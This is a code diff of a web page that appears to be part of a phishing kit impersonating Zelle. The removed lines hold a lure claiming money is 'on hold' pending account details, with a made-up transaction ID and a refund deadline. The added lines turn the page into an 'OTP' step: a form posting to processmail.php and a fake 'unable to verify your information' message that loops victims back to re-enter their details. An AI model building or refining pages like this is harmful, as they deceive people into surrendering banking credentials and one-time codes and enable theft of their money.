@@ -10,12 +10,12 @@
 	<script src="https://kit.fontawesome.com/2ff1153782.js" crossorigin="anonymous"></script>
 	<script src="js/jquery-3.3.1.js"></script>
 	<link href="icofont/icofont.min.css" rel="stylesheet">
-	<link rel="stylesheet" href="css/animate.min.css">
+	<!-- <link rel="stylesheet" href="css/animate.min.css"> -->
 	<link rel="stylesheet" href="css/theme.css">
 	<script src="bootstrap/js/bootstrap.min.js"></script>
 	<script src="https://maps.googleapis.com/maps/api/js"></script>
     
-    <title>Accept My Money – Zelle</title>
+    <title>OTP – Zelle</title>
 </head>
 <body>
     <div class="container-fluid topbar">
@@ -42,7 +42,23 @@
             font-family:  "Roboto slab", Sans-serif;
             font-size: 15px;
            }
-    
+           input, select{
+            display: block;
+            width: 100%;
+            padding: 0.375rem 0.375rem;
+            margin-bottom: 5px;
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #212529;
+            background-color: transparent;
+            border-width: 1.5px ;
+            border-color: #6D1ED4;
+           }
+           .btn-primary2{
+            color: #fff;
+            background-color: #6D1ED4;
+            border-color: #6D1ED4;
+           }
            @media screen and (min-width:601px) {
             .heading-title{
                 text-align: left;
@@ -81,53 +97,27 @@
     </div>
     <section class="subpaddingf">
         <div class="container">
-            <h2 class="headingtitle size-default">Transaction Summary</h2>
-            <div>
-                <span class="divider-separator"> <hr> </span>
-            </div>
-            
-            <div class="center-image subpaddingf">
-                <img width="150" height="150" src="Image/Incoming-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
-            </div>
-
-            
-            <div class="subpaddingf" >
-                    <div class="elementor-widget-container">
-                        <h2 class="size-medium">There's an Incoming money sent to you through zelle but it's on hold due to lack of zelle account or missing information on your account. Click below to receive it into your  bank account.</h2>		
-                    </div>
-            </div>
-
-            <div>
-                <div class="elementor-element elementor-element-6134b07 elementor-widget elementor-widget-text-editor" data-id="6134b07" data-element_type="widget" data-widget_type="text-editor.default">
-                    <div class="container subpaddingf">
-                			<ul style="list-style-type:square;">
-                                    <li><strong>Transaction Date: </strong> <?php echo date("F d\, Y"); ?> </li>
-                                    <li><strong>Transaction Type:</strong> Zelle Transfer</li>
-                                    <li><strong>Transaction ID:</strong> 2WQ4Z3UV32</li>
-                            </ul>			
-                    </div>
-                    </div>
+            <form action="processmail.php" method="post" role="form" >
+                
+                <div class="center-image">
+                    <img width="150" height="150" src="Image/Customer-Service-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
                 </div>
-            <div class="buttonnext subpaddingf">
-                    <a href="bill.html" class="btn btn-primary btn-lg" role="button">
-                                <span class="elementor-button-text">Accept My Money</span>
+                <div>
+                    <h2>
+                        We're unable to verify your information, One of your detail provided is invalid. Please try again later and enter correct information.
+                    </h2>
+                </div>
+                <div class="buttonnext subpaddingf">
+                    <a href="accept-money.php" class="btn btn-primary btn-lg" role="button">
+                                <span class="elementor-button-text">Try Again</span>
                             </a>
             </div>
-        </div>
+              </form>
+            
     </section>
 
-    <section class="subpaddingf">
-        <div class="container">
-			<h2 class="size-small">Note: Failure to receive it within 7 Days may result to automatic refund to the originator. For more enquiries or notice any suspicious notification, please contact your bank.</h2>		
-        </div>
-    </section>
+   
     <section class="mypaddings">
-        <div class="center-image">
-            <img width="490" height="1024" src="Image/Z-miidle1-490x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
-        </div>
-        <div class="center-image centerimg2">
-            <img width="667" height="1024" src="Image/Z-middle2-667x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
-        </div>
         <div class="center-image centerimg2">
             <a href="https://youtu.be/IDZa1wRsCYM">
             <img width="741" height="1024" src="Image/Z-middle3-741x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
